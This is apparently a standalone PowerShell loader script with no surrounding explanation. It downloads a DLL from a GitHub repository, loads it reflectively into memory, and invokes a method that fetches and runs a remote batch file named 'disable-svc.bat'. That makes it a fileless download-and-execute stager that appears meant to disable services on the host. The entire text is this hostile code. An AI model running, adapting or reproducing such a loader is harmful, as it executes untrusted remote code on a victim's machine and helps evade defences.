$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/pipezilla/msadev/raw/main/baak.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("batcalistir")
$method.Invoke(1, "https://raw.githubusercontent.com/pipezilla/msadev/main/disable-svc.bat")
